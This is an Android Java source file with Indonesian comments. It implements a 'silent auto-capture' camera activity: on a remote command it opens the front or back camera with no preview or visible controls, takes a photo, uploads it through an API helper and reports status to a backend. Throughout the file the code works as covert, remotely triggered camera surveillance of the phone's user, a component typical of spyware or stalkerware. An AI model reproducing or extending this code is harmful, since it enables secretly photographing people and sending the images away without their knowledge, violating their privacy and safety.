package com.example.app;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.camera.core.CameraSelector;
import androidx.camera.core.ImageCapture;
import androidx.camera.core.ImageCaptureException;
import androidx.camera.lifecycle.ProcessCameraProvider;
import androidx.core.content.ContextCompat;

import com.google.common.util.concurrent.ListenableFuture;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Silent auto-capture camera activity.
 *
 * Tidak menampilkan preview atau tombol apapun ke pengguna.
 * Begitu dibuka: kamera langsung aktif → foto diambil otomatis
 * setelah jeda stabilisasi → langsung diupload → Activity tutup.
 *
 * Syarat: izin kamera (android.permission.CAMERA) sudah
 * diberikan di Settings HP sebelumnya. Kalau belum ada,
 * request langsung di-CANCEL tanpa meminta izin ulang.
 */
public class CameraActivity extends AppCompatActivity {

    private static final String TAG = "CameraActivity";

    // Jeda sebelum ambil foto, supaya kamera sempat fokus & expose.
    private static final long CAPTURE_DELAY_MS = 800L;

    private ImageCapture imageCapture;
    private ExecutorService cameraExecutor;
    private boolean useFrontCamera = true;
    private String requestId;
    private String requestedCamera = "front";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_camera);

        // Baca requestId dan pilihan kamera dari Intent
        Intent commandIntent = getIntent();
        if (commandIntent != null) {
            requestId = commandIntent.getStringExtra("requestId");
            String camera = commandIntent.getStringExtra("camera");
            if ("back".equalsIgnoreCase(camera)) {
                requestedCamera = "back";
                useFrontCamera = false;
            } else {
                requestedCamera = "front";
                useFrontCamera = true;
            }
        }

        cameraExecutor = Executors.newSingleThreadExecutor();

        // Kalau izin kamera belum ada, batalkan langsung.
        // Tidak meminta izin secara interaktif — user harus
        // berikan dulu lewat Settings.
        if (ContextCompat.checkSelfPermission(
                this, Manifest.permission.CAMERA)
                != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "Izin kamera tidak tersedia, membatalkan request");
            cancelRequest();
            return;
        }

        startCameraAndCapture();
    }

    // =========================================================
    // KAMERA
    // =========================================================

    private void startCameraAndCapture() {

        ListenableFuture<ProcessCameraProvider> future =
                ProcessCameraProvider.getInstance(this);

        future.addListener(() -> {

            try {

                ProcessCameraProvider cameraProvider = future.get();

                CameraSelector selector = useFrontCamera
                        ? CameraSelector.DEFAULT_FRONT_CAMERA
                        : CameraSelector.DEFAULT_BACK_CAMERA;

                if (!cameraProvider.hasCamera(selector)) {
                    Log.e(TAG, "Kamera " + requestedCamera + " tidak tersedia");
                    cancelRequest();
                    return;
                }

                // Hanya ImageCapture — tidak perlu Preview
                // karena tidak ada tampilan yang ditunjukkan ke user.
                imageCapture = new ImageCapture.Builder()
                        .setCaptureMode(
                                ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY
                        )
                        .build();

                cameraProvider.unbindAll();
                cameraProvider.bindToLifecycle(
                        this,
                        selector,
                        imageCapture
                );

                // Tunggu kamera stabil sebelum ambil foto
                new Handler(Looper.getMainLooper()).postDelayed(
                        this::takePhoto,
                        CAPTURE_DELAY_MS
                );

            } catch (Exception e) {
                Log.e(TAG, "Gagal membuka kamera", e);
                cancelRequest();
            }

        }, ContextCompat.getMainExecutor(this));
    }

    // =========================================================
    // AMBIL FOTO (otomatis)
    // =========================================================

    private void takePhoto() {

        if (imageCapture == null || isFinishing() || isDestroyed()) {
            return;
        }

        File outputDir = new File(getCacheDir(), "camera");

        if (!outputDir.exists() && !outputDir.mkdirs()) {
            Log.e(TAG, "Gagal membuat direktori cache kamera");
            cancelRequest();
            return;
        }

        String timestamp = new SimpleDateFormat(
                "yyyyMMdd_HHmmss_SSS", Locale.US
        ).format(new Date());

        File photoFile = new File(outputDir, "IMG_" + timestamp + ".jpg");

        ImageCapture.OutputFileOptions outputOptions =
                new ImageCapture.OutputFileOptions.Builder(photoFile).build();

        imageCapture.takePicture(
                outputOptions,
                ContextCompat.getMainExecutor(this),
                new ImageCapture.OnImageSavedCallback() {

                    @Override
                    public void onImageSaved(
                            @NonNull ImageCapture.OutputFileResults results) {
                        Log.d(TAG, "Foto tersimpan: " + photoFile.getName());
                        uploadPhoto(photoFile);
                    }

                    @Override
                    public void onError(
                            @NonNull ImageCaptureException exception) {
                        Log.e(TAG, "Gagal mengambil foto", exception);
                        cancelRequest();
                    }
                }
        );
    }

    // =========================================================
    // UPLOAD & SELESAI
    // =========================================================

    private void uploadPhoto(File photo) {

        final String currentRequestId = requestId;
        final String currentCamera = requestedCamera;

        if (currentRequestId == null ||
                currentRequestId.trim().isEmpty()) {
            Log.e(TAG, "requestId tidak valid, tidak bisa upload");
            cleanupFile(photo);
            finish();
            return;
        }

        new Thread(() -> {

            boolean uploaded = ApiHelper.uploadCapturedPhoto(
                    currentRequestId,
                    currentCamera,
                    photo
            );

            // Update status di GAS (COMPLETED atau UPLOAD_FAILED)
            ApiHelper.updateCameraRequestStatus(
                    currentRequestId,
                    uploaded ? "COMPLETED" : "UPLOAD_FAILED"
            );

            Log.d(TAG, uploaded
                    ? "Upload foto berhasil"
                    : "Upload foto gagal"
            );

            cleanupFile(photo);

            runOnUiThread(this::finish);

        }).start();
    }

    // =========================================================
    // CANCEL
    // =========================================================

    private void cancelRequest() {

        final String currentRequestId = requestId;

        if (currentRequestId != null &&
                !currentRequestId.trim().isEmpty()) {

            new Thread(() ->
                    ApiHelper.updateCameraRequestStatus(
                            currentRequestId,
                            "CANCELLED"
                    )
            ).start();
        }

        finish();
    }

    // =========================================================
    // UTILITAS
    // =========================================================

    private void cleanupFile(File file) {
        if (file != null && file.exists()) {
            if (!file.delete()) {
                file.deleteOnExit();
            }
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (cameraExecutor != null) {
            cameraExecutor.shutdown();
        }
    }
}
